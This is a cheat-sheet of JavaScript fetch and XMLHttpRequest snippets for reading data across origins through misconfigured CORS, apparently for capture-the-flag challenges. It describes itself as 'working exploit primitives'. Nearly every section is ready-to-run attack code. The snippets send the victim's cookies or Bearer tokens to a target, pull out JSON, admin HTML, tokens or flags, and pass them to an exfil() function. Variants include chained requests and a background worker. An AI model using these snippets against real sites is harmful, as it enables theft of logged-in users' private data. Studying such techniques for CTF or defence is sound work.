# Fetch API notes — the exact JS that makes the CORS read

The `fetch` calls that carry the read — each a working exploit
primitive.

---

## 1. The simple GET — no preflight

```js
fetch('https://t/api/me', {credentials:'include'})
  .then(r => r.json())
  .then(d => exfil(d))
```

`credentials:'include'` carries the cookie; the response's ACAO+ACAC
decide whether `.json()` sees the body.

## 2. The response-body methods

```js
r.json()    // a JSON API — the common case
r.text()    // a raw flag body, or HTML to scrape
r.blob()    // a binary — an image/file flag
r.arrayBuffer() // raw bytes
```

## 3. The DOM-scrape read — the flag in HTML

```js
fetch('https://t/admin', {credentials:'include'})
  .then(r => r.text())
  .then(h => {
    var m = h.match(/FLAG\{[^}]+\}/);
    if (m) exfil(m[0]);
  })
```

## 4. The multi-step read — a token-then-flag chain

```js
fetch('https://t/api/token', {credentials:'include'})
  .then(r => r.json())
  .then(t => fetch('https://t/api/flag?k='+t.key, {credentials:'include'}))
  .then(r => r.text())
  .then(d => exfil(d))
```

## 5. The custom-header read — a Bearer/API-key credential

```js
fetch('https://t/api/me', {
  credentials:'include',
  headers:{'Authorization':'Bearer '+token}
}).then(r=>r.json()).then(d=>exfil(d))
```

A custom header needs a permissive preflight — ACAH must allow
`Authorization`.

## 6. The mode note — `cors` is the default for cross-origin

```js
// the default — the CORS read
fetch('https://t/api/x', {credentials:'include'})          // mode:'cors'
// 'no-cors' — an opaque write, NOT a read
fetch('https://t/api/x', {mode:'no-cors', credentials:'include'})
// 'same-origin' — refuses cross-origin
fetch('https://t/api/x', {mode:'same-origin'})
```

## 7. The credential-mode note

```js
'include'    // always send credentials — the read mode
'same-origin'// send only same-origin — default; NOT cross-origin
'omit'       // never send — public read only
```

For a CORS read you MUST set `credentials:'include'` — the default
(`same-origin`) sends no cookie cross-origin.

## 8. The abortController — a bounded read

```js
var c=new AbortController();
setTimeout(()=>c.abort(),3000);
fetch('https://t/api/x',{credentials:'include',signal:c.signal})
  .then(r=>r.text()).then(d=>exfil(d)).catch(()=>{})
```

## 9. The XHR alternative — older but same rules

```js
var x=new XMLHttpRequest();
x.open('GET','https://t/api/me');
x.withCredentials=true;                 // the credentials:'include' equivalent
x.onload=()=>exfil(x.responseText);
x.send();
```

## 10. The iframe + postMessage read — a different primitive

```html
<iframe src="https://t/api/me"></iframe>
<!-- a same-origin iframe read — needs an XSS on the target;
     the CORS case uses fetch, not iframe -->
```

## 11. The fetch-in-a-worker — a background read

```js
new Worker('data:text/javascript,fetch("https://t/api/me",{credentials:"include"}).then(r=>r.text()).then(d=>postMessage(d))')
  .onmessage=e=>exfil(e.data)
```

## 12. The error modes — what a failed read looks like

```js
fetch('https://t/api/x',{credentials:'include'})
 .then(r=>r.json()).then(d=>exfil(d))
 .catch(e=>{ /* a CORS error — the ACAO/ACAC blocked the read */ })
```

A `.catch` firing = the CORS gate held — the read didn't happen.

## 13. The fetch-shape index — which read to write

```text
a JSON API      → .json()
an HTML page    → .text() + a regex/scrape
a raw flag      → .text()
a token→flag    → chained .then()
a Bearer cred   → headers:{Authorization}
a no-preflight  → a GET or urlencoded POST, no custom headers
```
